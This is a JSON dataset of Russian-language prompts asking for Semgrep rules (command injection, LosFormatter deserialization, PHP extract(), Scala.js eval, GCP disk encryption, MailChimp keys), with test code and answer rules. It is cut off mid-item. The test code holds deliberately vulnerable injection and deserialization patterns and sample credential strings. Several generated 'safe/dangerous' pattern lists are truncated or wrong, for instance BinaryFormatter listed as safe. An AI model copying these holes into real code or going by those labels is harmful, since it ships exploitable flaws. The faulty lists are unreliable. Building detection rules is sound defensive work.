[
  {
    "instruction": "Напиши Semgrep правило для обнаружения: dangerous-subprocess-use\nОписание уязвимости: Detected subprocess function '$FUNC' with user controlled data. A malicious actor could leverage this to perform command injection. You may consider using 'shlex.escape()'.\nCWE: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\nТип анализа: taint\nЯзык: python\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: python\n- Тип анализа: taint\n- CWE: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: dangerous-subprocess-use.py\n# cf. https://github.com/returntocorp/semgrep/blob/develop/docs/writing_rules/examples.md#auditing-dangerous-function-use\n\nimport subprocess\nimport flask\n\napp = flask.Flask(__name__)\n\n\n@app.route(\"/route_param/<route_param>\")\ndef route_param(route_param):\n\n    # ruleid:dangerous-subprocess-use\n    subprocess.call(\"grep -R {} .\".format(route_param), shell=True, cwd=\"/home/user\")\n\n    # ruleid:dangerous-subprocess-use\n    subprocess.call([\"sh\", \"-c\", \"grep -R {} .\".format(route_param)], shell=True, cwd=\"/home/user\") # Tests list input\n\n    # ruleid:dangerous-subprocess-use\n    subprocess.call((\"sh\", \"-c\", \"grep -R {} .\".format(route_param)), shell=True, cwd=\"/home/user\") # Tests tuple input\n\n    # ruleid:dangerous-subprocess-use\n    subprocess.call(\"grep -R {} .\".format(route_param), shell=True, cwd=\"/home/user\")\n\n    return \"oops!\"\n\n\n# Flask true negatives\n@app.route(\"/route_param/<route_param>\")\ndef route_param2(route_param):\n\n    # ok:dangerous-subprocess-use\n    subprocess.call(\"static\", shell=True, cwd=\"/home/user\")\n\n    # ok:dangerous-subprocess-use\n    subprocess.call([\"sh\", \"-c\", \"/bin/ls\"], shell=True, cwd=\"/home/user\")\n\n    # ok:dangerous-subprocess-use\n    subprocess.call((\"sh\", \"-c\", \"/bin/ls\"), shell=True, cwd=\"/home/user\")\n\n    return \"ok!\"  # Ограничиваем длину\n\nОпасные паттерны:\n• subprocess.call(\"grep -R {} .\".format(route_param), shell=True, cwd=\"/home/user\")\n• subprocess.call([\"sh\", \"-c\", \"grep -R {} .\".format(route_param)], shell=True, cwd=\"/home/user\")\n• subprocess.call((\"sh\", \"-c\", \"grep -R {} .\".format(route_param)), shell=True, cwd=\"/home/user\")\n\nБезопасные паттерны:  \n• subprocess.call(\"static\", shell=True, cwd=\"/home/user\")\n• subprocess.call([\"sh\", \"-c\", \"/bin/ls\"], shell=True, cwd=\"/home/user\")\n• subprocess.call((\"sh\", \"-c\", \"/bin/ls\"), shell=True, cwd=\"/home/user\")\n\nЛегенда аннотаций:\n- // ruleid:dangerous-subprocess-use: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:dangerous-subprocess-use: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: dangerous-subprocess-use\n  mode: taint\n  options:\n    symbolic_propagation: true\n  pattern-sources:\n  - patterns:\n    - pattern-either:\n      - patterns:\n        - pattern-either:\n          - pattern: flask.request.form.get(...)\n          - pattern: flask.request.form[...]\n          - pattern: flask.request.args.get(...)\n          - pattern: flask.request.args[...]\n          - pattern: flask.request.values.get(...)\n          - pattern: flask.request.values[...]\n          - pattern: flask.request.cookies.get(...)\n          - pattern: flask.request.cookies[...]\n          - pattern: flask.request.stream\n          - pattern: flask.request.headers.get(...)\n          - pattern: flask.request.headers[...]\n          - pattern: flask.request.data\n          - pattern: flask.request.full_path\n          - pattern: flask.request.url\n          - pattern: flask.request.json\n          - pattern: flask.request.get_json()\n          - pattern: flask.request.view_args.get(...)\n          - pattern: flask.request.view_args[...]\n          - patterns:\n            - pattern-inside: |\n                @$APP.route(...)\n                def $FUNC(..., $ROUTEVAR, ...):\n                  ...\n            - focus-metavariable: $ROUTEVAR\n      - patterns:\n        - pattern-inside: |\n            def $FUNC(request, ...):\n              ...\n        - pattern-either:\n          - pattern: request.$PROPERTY.get(...)\n          - pattern: request.$PROPERTY[...]\n      - patterns:\n        - pattern-either:\n          - pattern-inside: |\n              @rest_framework.decorators.api_view(...)\n              def $FUNC($REQ, ...):\n                ...\n          - patterns:\n            - pattern-either:\n              - pattern-inside: |\n                  class $VIEW(..., rest_framework.views.APIView, ...):\n                    ...\n              - pattern-inside: |\n                  class $VIEW(..., rest_framework.generics.GenericAPIView, ...):\n                    ...                              \n            - pattern-inside: |\n                def $METHOD(self, $REQ, ...):\n                  ...\n            - metavariable-regex:\n                metavariable: $METHOD\n                regex: (get|post|put|patch|delete|head)\n        - pattern-either:\n          - pattern: $REQ.POST.get(...)\n          - pattern: $REQ.POST[...]\n          - pattern: $REQ.FILES.get(...)\n          - pattern: $REQ.FILES[...]\n          - pattern: $REQ.DATA.get(...)\n          - pattern: $REQ.DATA[...]\n          - pattern: $REQ.QUERY_PARAMS.get(...)\n          - pattern: $REQ.QUERY_PARAMS[...]\n          - pattern: $REQ.data.get(...)\n          - pattern: $REQ.data[...]\n          - pattern: $REQ.query_params.get(...)\n          - pattern: $REQ.query_params[...]\n          - pattern: $REQ.content_type\n          - pattern: $REQ.content_type\n          - pattern: $REQ.stream\n          - pattern: $REQ.stream\n      - patterns:\n        - pattern-either:\n          - pattern-inside: |\n              class $SERVER(..., http.server.BaseHTTPRequestHandler, ...):\n                ...\n          - pattern-inside: |\n              class $SERVER(..., http.server.StreamRequestHandler, ...):\n                ...\n          - pattern-inside: |\n              class $SERVER(..., http.server.DatagramRequestHandler, ...):\n                ...\n        - pattern-either:\n          - pattern: self.requestline\n          - pattern: self.path\n          - pattern: self.headers[...]\n          - pattern: self.headers.get(...)\n          - pattern: self.rfile\n      - patterns:\n        - pattern-inside: |\n            @pyramid.view.view_config( ... )\n            def $VIEW($REQ):\n              ...\n        - pattern: $REQ.$ANYTHING\n        - pattern-not: $REQ.dbsession\n  pattern-sinks:\n  - patterns:\n    - pattern-either:\n      - patterns:\n        - pattern-not: subprocess.$FUNC(\"...\", ...)\n        - pattern-not: subprocess.$FUNC([\"...\",...], ...)\n        - pattern-not: subprocess.$FUNC((\"...\",...), ...)\n        - pattern-not: subprocess.CalledProcessError(...)\n        - pattern-not: subprocess.SubprocessError(...)\n        - pattern: subprocess.$FUNC($CMD, ...)\n      - patterns:\n        - pattern-not: subprocess.$FUNC(\"=~/(sh|bash|ksh|csh|tcsh|zsh)/\",\"-c\",\"...\",...)\n        - pattern: subprocess.$FUNC(\"=~/(sh|bash|ksh|csh|tcsh|zsh)/\",\"-c\", $CMD)\n      - patterns:\n        - pattern-not: subprocess.$FUNC([\"=~/(sh|bash|ksh|csh|tcsh|zsh)/\",\"-c\",\"...\",...],...)\n        - pattern-not: subprocess.$FUNC((\"=~/(sh|bash|ksh|csh|tcsh|zsh)/\",\"-c\",\"...\",...),...)\n        - pattern-either:\n          - pattern: subprocess.$FUNC([\"=~/(sh|bash|ksh|csh|tcsh|zsh)/\",\"-c\", $CMD], ...)\n          - pattern: subprocess.$FUNC((\"=~/(sh|bash|ksh|csh|tcsh|zsh)/\",\"-c\", $CMD), ...)\n      - patterns:\n        - pattern-not: subprocess.$FUNC(\"=~/(python)/\",\"...\",...)\n        - pattern: subprocess.$FUNC(\"=~/(python)/\", $CMD)\n      - patterns:\n        - pattern-not: subprocess.$FUNC([\"=~/(python)/\",\"...\",...],...)\n        - pattern-not: subprocess.$FUNC((\"=~/(python)/\",\"...\",...),...)\n        - pattern-either:\n          - pattern: subprocess.$FUNC([\"=~/(python)/\", $CMD],...)\n          - pattern: subprocess.$FUNC((\"=~/(python)/\", $CMD),...)\n    - focus-metavariable: $CMD\n  message: >-\n    Detected subprocess function '$FUNC' with user controlled data. A malicious actor\n    could leverage this to perform command injection.\n    You may consider using 'shlex.escape()'.\n  metadata:\n    owasp:\n    - A01:2017 - Injection\n    - A03:2021 - Injection\n    cwe:\n    - \"CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\"\n    asvs:\n      section: 'V5: Validation, Sanitization and Encoding Verification Requirements'\n      control_id: 5.3.8 OS Command Injection\n      control_url: https://github.com/OWASP/ASVS/blob/master/4.0/en/0x13-V5-Validation-Sanitization-Encoding.md#v53-output-encoding-and-injection-prevention-requirements\n      version: '4'\n    references:\n    - https://stackoverflow.com/questions/3172470/actual-meaning-of-shell-true-in-subprocess\n    - https://docs.python.org/3/library/subprocess.html\n    - https://docs.python.org/3/library/shlex.html\n    - https://semgrep.dev/docs/cheat-sheets/python-command-injection/\n    category: security\n    technology:\n    - python\n    confidence: MEDIUM\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: HIGH\n  languages: [python]\n  severity: ERROR\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования функций subprocess в Python, где аргументы командной строки формируются из потенциально контролируемого пользователем ввода. Правило проверяет источники данных (данные запроса, заголовки, файлы и другие переменные) и сопоставляет их с шаблонами, которые могут быть переданы в функции subprocess. Если данные передаются напрямую в функцию subprocess без предварительной обработки, такие как экранирование или нейтрализация специальных символов, то возникает риск выполнения команды с инъекцией ОС. Правило также учитывает исключения, связанные с безопасными вызовами функций subprocess, такими как использование регулярных выражений для фильтрации опасных командных интерпретаторов.\n\n# Ключевые элементы:\n- ID: dangerous-subprocess-use\n- Язык: python \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "dangerous-subprocess-use",
      "language": "python",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: insecure-losformatter-deserialization\nОписание уязвимости: The LosFormatter type is dangerous and is not recommended for data processing. Applications should stop using LosFormatter as soon as possible, even if they believe the data they're processing to be trustworthy. LosFormatter is insecure and can't be made secure\nCWE: CWE-502: Deserialization of Untrusted Data\nТип анализа: search\nЯзык: C#",
    "input": "Требования:\n- Язык: C#\n- Тип анализа: search\n- CWE: CWE-502: Deserialization of Untrusted Data\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: los-formatter.cs\nusing System.Web.UI;\n\nnamespace InsecureDeserialization\n{\n    public class InsecureLosFormatterDeserialization\n    {\n        public void LosFormatterDeserialization(string json)\n        {\n            try\n            {\n                // ruleid: insecure-losformatter-deserialization\n                LosFormatter losFormatter = new LosFormatter();\n                object obj = losFormatter.Deserialize(json);\n            }\n            catch (Exception e)\n            {\n                Console.WriteLine(e);\n            }\n        }\n    }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• using System.Web.UI;\npublic class Example {\n    public void Method() {\n        new LosFormatter();\n    }\n}\n• using System.Web.UI;\npublic class AnotherExample {\n    private LosFormatter formatter;\n    public void Initialize() {\n        this.formatter = new LosFormatter();\n    }\n}\n\nБезопасные паттерны:  \n• using System.Web.UI;\npublic class SafeExample {\n    public void Method() {\n        // some safe code\n    }\n}\n• using System.Runtime.Serialization.Formatters.Binary;\npublic class BinaryFormatterExample {\n    public void Method() {\n        new BinaryFormatter();\n    }\n}\n\nЛегенда аннотаций:\n- // ruleid:insecure-losformatter-deserialization: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:insecure-losformatter-deserialization: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: insecure-losformatter-deserialization\n  severity: WARNING\n  languages:\n  - C#\n  metadata:\n    cwe:\n    - 'CWE-502: Deserialization of Untrusted Data'\n    owasp:\n    - A08:2017 - Insecure Deserialization\n    - A08:2021 - Software and Data Integrity Failures\n    references:\n    - https://docs.microsoft.com/en-us/dotnet/api/system.web.ui.losformatter?view=netframework-4.8\n    category: security\n    technology:\n    - .net\n    confidence: MEDIUM\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: LOW\n    impact: HIGH\n  message: >-\n    The LosFormatter type is dangerous and is not recommended for data processing. Applications should\n    stop using LosFormatter\n    as soon as possible, even if they believe the data they're processing to be trustworthy. LosFormatter\n    is insecure and\n    can't be made secure\n  patterns:\n  - pattern-inside: |\n      using System.Web.UI;\n      ...\n  - pattern: |\n      new LosFormatter();\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования типа LosFormatter в C# коде. Анализ выполняется путем поиска конструкции 'new LosFormatter()' внутри блока 'using System.Web.UI; ...'. Это позволяет обнаружить потенциальную угрозу десериализации недоверенных данных, так как тип LosFormatter считается небезопасным и не рекомендуется для обработки данных.\n\n# Ключевые элементы:\n- ID: insecure-losformatter-deserialization\n- Язык: C# \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "insecure-losformatter-deserialization",
      "language": "C#",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения extract-user-data\nОписание уязвимости: Do not call 'extract()' on user-controllable data. If you must, then you must also provide the EXTR_SKIP flag to prevent overwriting existing variables.\nCWE: CWE-502: Deserialization of Untrusted Data\nТип анализа: taint\nЯзык: php\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле\nСпособы санитации: определены в правиле",
    "input": "Требования:\n- Язык: php\n- Тип анализа: taint\n- CWE: CWE-502: Deserialization of Untrusted Data\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: deserialization.php\n\n<?php\n\n/* Suppose that $var_array is an array returned from\n   wddx_deserialize */\n\n$size = \"large\";\n$var_array = array(\"color\" => \"blue\",\n                   \"size\"  => \"medium\",\n                   \"shape\" => \"sphere\");\n// ok: extract-user-data\nextract($var_array, EXTR_PREFIX_SAME, \"wddx\");\n\n$bad = $_GET['some_param'];\n// ruleid:extract-user-data\nextract($bad, EXTR_PREFIX_SAME, \"wddx\");\necho \"$color, $size, $shape, $wddx_size\\n\";\n\n$bad2 = $_FILES[\"/some/bad/path\"];\n// ruleid:extract-user-data\nextract($bad2, EXTR_PREFIX_SAME, \"wddx\");\n\n// ok: extract-user-data\n$ok = $_FILES[\"/some/bad/path\"];\nextract($ok, EXTR_SKIP, \"wddx\");\n?>  # Ограничиваем длину\n\nОпасные паттерны:\n• extract($bad, EXTR_PREFIX_SAME, \"wddx\");\n• extract($_GET['some_param'], EXTR_PREFIX_SAME, \"wddx\");\n• extract($_FILES[\"/some/bad/path\"], EXTR_PREFIX_SAME, \"wddx\");\n\nБезопасные паттерны:  \n• extract($var_array, EXTR_PREFIX_SAME, \"wddx\");\n• extract($ok, EXTR_SKIP, \"wddx\");\n• extract($_FILES[\"/some/bad/path\"], EXTR_SKIP, \"wddx\");\n\nЛегенда аннотаций:\n- // ruleid:extract-user-data: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:extract-user-data: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: extract-user-data\n  mode: taint\n  pattern-sources:\n  - pattern-either:\n    - pattern: $_GET[...]\n    - pattern: $_FILES[...]\n    - pattern: $_POST[...]\n  pattern-sinks:\n  - pattern: extract(...)\n  pattern-sanitizers:\n  - pattern: extract($VAR, EXTR_SKIP,...)\n  message: Do not call 'extract()' on user-controllable data. If you must, then you must also provide\n    the EXTR_SKIP flag to prevent overwriting existing variables.\n  languages:\n  - php\n  metadata:\n    category: security\n    cwe:\n    - 'CWE-502: Deserialization of Untrusted Data'\n    owasp:\n    - A08:2017 - Insecure Deserialization\n    - A08:2021 - Software and Data Integrity Failures\n    technology:\n    - php\n    references:\n    - https://www.php.net/manual/en/function.extract.php#refsect1-function.extract-notes\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: MEDIUM\n  severity: ERROR\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска вызовов функции extract(), принимающей данные, контролируемые пользователем, без использования флага EXTR_SKIP, который предотвращает перезапись существующих переменных. Источники потенциально опасных данных определяются шаблонами $_GET[...], $_FILES[...] и $_POST[...]. Синки обнаруживаются при вызове функции extract(...). Правило также учитывает санкитизацию через шаблон extract($VAR, EXTR_SKIP,...), которая считается безопасной практикой.\n\n# Ключевые элементы:\n- ID: extract-user-data\n- Язык: php \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "extract-user-data",
      "language": "php",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: improper-list-concat\nОписание уязвимости: This expression will evaluate to be ONLY value the of the `else` clause if the condition `$EXPRESSION` is false. If you meant to do list concatenation, put parentheses around the entire concatenation expression, like this: `['a', 'b', 'c'] + (['d'] if x else ['e'])`. If this is the intended behavior, the expression may be confusing to others, and you may wish to add parentheses for readability.\nCWE: \nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: \n- Серьезность: INFO\n\nКонтекст кода:\n// File: improper-list-concat.py\nx = False\n# ruleid: improper-list-concat\n['a', 'b', 'c'] + ['d'] if x else []\n\nx = 1234\n# ruleid: improper-list-concat\n['a', 'b', 'c'] + ['d'] if x > 1000 else ['e']\n\n# ok: improper-list-concat\n['a', 'b', 'c'] + (['d'] if x > 1000 else ['e'])  # Ограничиваем длину\n\nОпасные паттерны:\n• [...] + [...] if x else [...]\n• [...] + [...] if x > 1000 else [...]\n\nБезопасные паттерны:  \n• [...] + (...) if ...\n\nЛегенда аннотаций:\n- // ruleid:improper-list-concat: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:improper-list-concat: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: improper-list-concat\n    languages:\n      - python\n    message: >-\n      This expression will evaluate to be ONLY value the of the `else` clause if the\n      condition `$EXPRESSION`\n      is false. If you meant to do list concatenation, put parentheses around the entire\n      concatenation expression, like\n      this: `['a', 'b', 'c'] + (['d'] if x else ['e'])`. If this is the intended behavior,\n      the expression may be confusing to\n      others, and you may wish to add parentheses for readability.\n    metadata:\n      category: maintainability\n      technology:\n        - python\n    pattern: \"[...] + [...] if $EXPRESSION else [...]\"\n    severity: INFO\n\n\n# Логика правила:\nSemgrep правило ищет выражения в Python, которые используют конкатенацию списков внутри условных операторов without parentheses. Правило применяет шаблон поиска, который соответствует выражению списка, за которым следует оператор '+' и еще одно выражение списка, после которого идет условие 'if ... else'. Это может привести к неправильной интерпретации кода, так как результат выражения всегда будет равен значению из 'else' части условия при ложном условии. Для корректности и читаемости рекомендуется использовать круглые скобки вокруг всего выражения.\n\n# Ключевые элементы:\n- ID: improper-list-concat\n- Язык: python \n- Тип: \n- Серьезность: INFO",
    "metadata": {
      "rule_id": "improper-list-concat",
      "language": "python",
      "severity": "INFO",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: scalajs-eval\nОписание уязвимости: `eval()` function evaluates JavaScript code represented as a string. Executing JavaScript from a string is an enormous security risk. It is far too easy for a bad actor to run arbitrary code when you use `eval()`. Do not use eval(). Alternatively: Ensure evaluated content is not definable by external sources. If it’s not possible, strip everything except alphanumeric characters from an input provided for the command string and arguments.\nCWE: CWE-94: Improper Control of Generation of Code ('Code Injection')\nТип анализа: taint\nЯзык: scala\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: scala\n- Тип анализа: taint\n- CWE: CWE-94: Improper Control of Generation of Code ('Code Injection')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: scalajs-eval.scala\npackage controllers\n\nimport scala.scalajs.js\n\nobject Smth {\n  def call1(code: String) = {\n    // ruleid: scalajs-eval\n    js.eval(s\"console.log($code)\")\n    // ok: scalajs-eval\n    js.eval(\"FooBar()\")\n    true\n  }\n}\n\nobject FooBar {\n  def call2(code: String) = {\n    // ruleid: scalajs-eval\n    js.eval(\"console.log(\" + code +\")\")\n    // ok: scalajs-eval\n    js.eval(\"FooBar()\")\n    true\n  }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• js.eval(s\\\n• )\n• js.eval(\\\n\nБезопасные паттерны:  \n• js.eval(\\\n• )\n• js.eval(s\\\n\nЛегенда аннотаций:\n- // ruleid:scalajs-eval: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:scalajs-eval: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: scalajs-eval\n  mode: taint\n  pattern-sources:\n  - patterns:\n    - pattern: $PARAM\n    - pattern-either:\n      - pattern-inside: |\n          def $CTRL(..., $PARAM: $TYPE, ...) = {\n            ...\n          }\n      - pattern-inside: |\n          def $CTRL(..., $PARAM: $TYPE, ...) = $A {\n            ...\n          }\n      - pattern-inside: |\n          def $CTRL(..., $PARAM: $TYPE, ...) = $A(...) {\n            ...\n          }\n  pattern-sinks:\n  - patterns:\n    - pattern: $JS.eval(...)\n    - pattern-inside: |\n        import scala.scalajs.$X\n        ...\n  message: >-\n    `eval()` function evaluates JavaScript code represented as a string. Executing JavaScript from a string\n    is an enormous security risk.\n    It is far too easy for a bad actor to run arbitrary code when you use `eval()`.\n    Do not use eval(). Alternatively: Ensure evaluated content is not definable by external sources.\n    If it’s not possible, strip everything except alphanumeric characters from an input provided for the\n    command string and arguments.\n  metadata:\n    references:\n    - https://www.scala-js.org/doc/\n    cwe:\n    - \"CWE-94: Improper Control of Generation of Code ('Code Injection')\"\n    owasp:\n    - A03:2021 - Injection\n    category: security\n    technology:\n    - scala\n    - scala-js\n    confidence: LOW\n    cwe2022-top25: true\n    subcategory:\n    - vuln\n    likelihood: LOW\n    impact: HIGH\n  languages: [scala]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования функции eval() в Scala.js. Источники (sources) определяют параметры функций, которые могут быть переданы в eval(), используя шаблоны, включающие имена параметров ($PARAM). Синки (sinks) идентифицируют вызовы eval() через шаблон $JS.eval(...), который проверяет наличие импорта scala.scalajs.*. Правило ищет случаи, когда строка, переданная в eval(), может быть определена внешними источниками, что представляет угрозу безопасности.\n\n# Ключевые элементы:\n- ID: scalajs-eval\n- Язык: scala \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "scalajs-eval",
      "language": "scala",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: gcp-compute-boot-disk-encryption\nОписание уязвимости: Ensure VM disks for critical VMs are encrypted with Customer Supplied Encryption Keys (CSEK)\nCWE: CWE-311: Missing Encryption of Sensitive Data\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-311: Missing Encryption of Sensitive Data\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: gcp-compute-boot-disk-encryption.tf\n# fail\n# ruleid: gcp-compute-boot-disk-encryption\nresource \"google_compute_instance\" \"fail\" {\n    name         = \"test\"\n    machine_type = \"n1-standard-1\"\n    zone         = \"us-central1-a\"\n    boot_disk {}\n}\n\n# ok: gcp-compute-boot-disk-encryption\nresource \"google_compute_instance\" \"success\" {\n    name         = \"test\"\n    machine_type = \"n1-standard-1\"\n    zone         = \"us-central1-a\"\n    boot_disk {\n        disk_encryption_key_raw = \"acXTX3rxrKAFTF0tYVLvydU1riRZTvUNC4g5I11NY-c=\"\n    }\n}\n\n# ok: gcp-compute-boot-disk-encryption\nresource \"google_compute_instance\" \"success\" {\n    name         = \"test\"\n    machine_type = \"n1-standard-1\"\n    zone         = \"us-central1-a\"\n    boot_disk {\n        kms_key_self_link = google_kms_crypto_key.example-key.id\n    }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"google_compute_instance\" \"fail\" { \n    name         = \"test\"\n    machine_type = \"n1-standard-1\"\n    zone         = \"us-central1-a\"\n    boot_disk {}\n}\n• resource \"google_compute_instance\" \"another-fail\" { \n    name         = \"test2\"\n    machine_type = \"n1-highmem-8\"\n    zone         = \"us-east1-b\"\n    boot_disk {\n        type = \"pd-ssd\"\n    }\n}\n\nБезопасные паттерны:  \n• resource \"google_compute_instance\" \"success\" { \n    name         = \"test\"\n    machine_type = \"n1-standard-1\"\n    zone         = \"us-central1-a\"\n    boot_disk {\n        disk_encryption_key_raw = \"acXTX\n• resource \"google_compute_instance\" \"success-kms\" { \n    name         = \"test-kms\"\n    machine_type = \"n1-highmem-8\"\n    zone         = \"us-west1-a\"\n    boot_disk {\n        kms_key_self_link = google_k\n\nЛегенда аннотаций:\n- // ruleid:gcp-compute-boot-disk-encryption: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:gcp-compute-boot-disk-encryption: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: gcp-compute-boot-disk-encryption\n  patterns:\n  - pattern: |\n      resource \"google_compute_instance\" $ANYTHING {\n        ...\n      }\n  - pattern-not-inside: |\n      resource \"google_compute_instance\" $ANYTHING {\n        ...\n        boot_disk {\n          disk_encryption_key_raw = ...\n        }\n        ...\n      }\n  - pattern-not-inside: |\n      resource \"google_compute_instance\" $ANYTHING {\n        ...\n        boot_disk {\n          kms_key_self_link = ...\n        }\n        ...\n      }\n  message: Ensure VM disks for critical VMs are encrypted with Customer Supplied Encryption Keys (CSEK)\n  languages: [hcl]\n  severity: WARNING\n  metadata:\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A04:2021 - Insecure Design\n    cwe:\n    - 'CWE-311: Missing Encryption of Sensitive Data'\n    technology:\n    - terraform\n    - gcp\n    category: security\n    references:\n    - https://docs.bridgecrew.io/docs/google-cloud-policy-index\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов Google Compute Engine с незашифрованными корневыми дисками. Анализ выполняется путем поиска шаблонов HCL-кода, которые описывают ресурсы compute instance. Правило проверяет отсутствие атрибутов 'disk_encryption_key_raw' или 'kms_key_self_link', необходимых для шифрования дисков с использованием ключей, предоставленных пользователем. Примеры опасного кода демонстрируют ресурсы без этих атрибутов, тогда как безопасный код содержит хотя бы один из них.\n\n# Ключевые элементы:\n- ID: gcp-compute-boot-disk-encryption\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "gcp-compute-boot-disk-encryption",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения: detected-mailchimp-api-key\nОписание уязвимости: MailChimp API Key detected\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: detected-mailchimp-api-key.txt\n# ruleid: detected-mailchimp-api-key\nac954d9304919994498d92eb0c1669b0-us8  # Ограничиваем длину\n\nОпасные паттерны:\n• const apiKey = 'ac954d9304919994498d92eb0c1669b0-us8';\n• let mailchimpApiKey = 'bcdefghijklmmnopqrstuvwxyz1234-us1';\n• var mc_api_key = 'abcdef1234567890abcdef1234567890-us9';\n\nБезопасные паттерны:  \n• function getMailChimpApiKey() { return 'abc123-def456-us12'; }\n• apiKey = generateRandomApiKey();\n• mailchimpApiKey = fetchFromEnvironmentVariable('MAILCHIMP_API_KEY');\n\nЛегенда аннотаций:\n- // ruleid:detected-mailchimp-api-key: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:detected-mailchimp-api-key: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: detected-mailchimp-api-key\n  pattern-regex: '[0-9a-f]{32}-us[0-9]{1,2}'\n  languages: [regex]\n  message: MailChimp API Key detected\n  severity: ERROR\n  metadata:\n    source-rule-url: https://github.com/dxa4481/truffleHogRegexes/blob/master/truffleHogRegexes/regexes.json\n    category: security\n    cwe:\n    - 'CWE-798: Use of Hard-coded Credentials'\n    technology:\n    - secrets\n    - mailchimp\n    confidence: LOW\n    owasp:\n    - A07:2021 - Identification and Authentication Failures\n    references:\n    - https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n\n\n# Логика правила:\nЭто правило использует регулярное выражение для поиска строк, состоящих из 32 шестнадцатеричных символов, за которыми следует '-us' и двузначное число. Это соответствует формату идентификаторов API MailChimp. Правило применяет поисковый анализ (search) для выявления жестко закодированных ключей API MailChimp, которые могут быть случайно оставлены разработчиками в исходном коде и представлять угрозу безопасности.\n\n# Ключевые элементы:\n- ID: detected-mailchimp-api-key\n- Язык: regex \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "detected-mailchimp-api-key",
      "language": "regex",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: documentbuilderfactory-external-general-entities-true\nОписание уязвимости: External entities are allowed for $DBFACTORY. This is vulnerable to XML external entity attacks. Disable this by setting the feature \"http://xml.org/sax/features/external-general-entities\" to false.\nCWE: CWE-611: Improper Restriction of XML External Entity Reference\nТип анализа: search\nЯзык: java",
